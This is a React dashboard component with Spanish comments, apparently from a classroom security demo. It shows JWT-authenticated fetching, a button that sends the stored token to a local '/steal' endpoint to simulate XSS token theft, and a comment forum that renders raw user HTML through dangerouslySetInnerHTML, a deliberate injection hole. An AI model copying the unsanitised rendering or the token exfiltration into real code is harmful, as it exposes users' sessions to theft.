import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom"; 

function Dashboard() {
  const [message, setMessage] = useState("");
  const [comment, setComment] = useState("");
  const [comments, setComments] = useState([]);
  const [pushup, setPushup] = useState(null);
  
  const navigate = useNavigate(); // Instanciamos el hook

  useEffect(() => {
    const token = localStorage.getItem("token");

    // Si por algún motivo entra sin token, lo sacamos directamente
    if (!token) {
      navigate("/");
      return;
    }

    fetch("http://localhost:4000/dashboard", {
      headers: {
        Authorization: "Bearer " + token
      }
    })
      .then(async (res) => {
        // 3. CAPTURAMOS EL ERROR 401 (Token expirado o inválido)
        if (res.status === 401) {
          const errorData = await res.json();
          console.warn("SESIÓN RECHAZADA (Abisai Ruiz):", errorData.message);
          
          // Mostramos alerta, borramos el token inservible y redirigimos
          alert(errorData.message); 
          localStorage.removeItem("token");
          navigate("/"); 
          
          throw new Error("Sesión expirada");
        }
        
        if(!res.ok) throw new Error("Error en la petición");
        
        return res.json();
      })
      .then(data => {
        console.log("Dashboard JSON (Abisai Ruiz):", data);
        setMessage(data.message);
      })
      .catch(error => console.error("Error en Dashboard (Abisai Ruiz):", error));
  }, [navigate]);

  const addComment = () => {
    setComments([...comments, comment]);
    setComment(""); // Limpiar el input después de agregar
  };

  // Función para activar el Pushup (Popup) y simular el XSS al endpoint /steal
  const simularRoboToken = () => {
    const token = localStorage.getItem("token") || "No hay token disponible";
    const alertMessage = `Token interceptado: ${token.substring(0, 20)}...`;
    
    console.warn("ALERTA DE SEGURIDAD (Abisai Ruiz):", alertMessage);
    
    // Enviamos el token robado al backend usando tu ruta /steal
    fetch(`http://localhost:4000/steal?token=${token}`)
      .then(res => res.json())
      .then(data => console.log("Resultado del ataque (Abisai Ruiz):", data.message))
      .catch(err => console.error("Error al robar token:", err));

    setPushup(alertMessage);
    
    // El pushup desaparece después de 5 segundos
    setTimeout(() => {
      setPushup(null);
    }, 5000);
  };

  return (
    <div className="dashboard-container">
      {/* Componente del Pushup */}
      {pushup && (
        <div className="pushup-notification">
          <strong style={{ color: '#f97316' }}>⚠️ Abisai Ruiz - Alerta de Sistema</strong>
          <p style={{ margin: '8px 0 0 0', fontSize: '14px' }}>{pushup}</p>
        </div>
      )}

      <div className="card" style={{ maxWidth: '100%' }}>
        <h2 className="title">{message || "Cargando Panel..."}</h2>
        
        {/* Botón para simular el ataque XSS y ver el Pushup */}
        <button 
          onClick={simularRoboToken} 
          style={{ backgroundColor: '#1f2937', marginBottom: '2rem' }}
        >
          Ejecutar Script Malicioso (Robar Token)
        </button>

        <div style={{ marginTop: '1rem', borderTop: '1px solid #d1d5db', paddingTop: '2rem' }}>
          <h3 style={{ textAlign: 'left', color: '#4b5563' }}>Foro de comentarios</h3>
          
          <div className="comment-box">
            <input
              placeholder="Escribe un comentario HTML (ej. <b style='color:red'>Hola</b>)"
              value={comment}
              onChange={e => setComment(e.target.value)}
            />
            <button onClick={addComment}>Publicar</button>
          </div>

          <div>
            {comments.map((c, i) => (
              <div 
                key={i} 
                className="comment-item"
                dangerouslySetInnerHTML={{ __html: c }} 
              />
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

export default Dashboard;